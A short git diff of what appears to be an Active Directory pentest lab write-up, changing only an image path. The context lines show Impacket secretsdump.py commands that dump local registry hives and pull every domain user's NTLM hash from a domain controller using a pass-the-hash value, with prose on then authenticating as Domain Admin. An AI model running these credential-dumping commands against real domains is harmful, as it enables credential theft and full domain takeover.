@@ -94,7 +94,7 @@ secretsdump.py LOCAL -system ~/adlab/SYSTEM -security ~/adlab/SECURITY -sam ~/ad
 secretsdump.py 'secure.local/dc03$'@dc03.secure.local -hashes aad3b435b51404eeaad3b435b51404ee:ba6414d4e6ce546465b256950282c7f3
 ```
 
-![](<../../../.gitbook/assets/image (18) (1) (1).png>)
+![](<../../../.gitbook/assets/image (18) (1) (1) (1).png>)
 
 We retrieved the NTLM account hash of every user in the domain and could authenticate with these to the domain controller. As Administrator for example which is Domain Admin.
 
